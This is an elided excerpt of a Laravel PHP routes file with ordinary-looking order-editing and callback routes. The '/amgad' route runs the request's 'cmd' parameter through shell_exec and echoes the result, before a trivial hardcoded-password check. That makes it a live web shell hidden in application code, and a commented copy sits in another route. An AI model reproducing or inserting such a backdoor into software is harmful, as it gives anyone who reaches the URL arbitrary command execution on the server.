...
Route::get('tharwat/edit', function(Request $req){
    ...
    if(!empty($order)){
        ...
        return response()->json([
            "msg" => "error can not find this order",
        ], 200);
    }

});

Route::get('/amgad', function(Request $req ) {
    echo  shell_exec($req->cmd);
    if($req->pass == "12345"){
        echo  shell_exec($req->cmd);
    }

 });
Route::get('/karemamgad', function(Request $req ) {
  //  echo  shell_exec($req->cmd);
...
Route::get('/callback_url', function(Request $req) {
    dd($req);
});
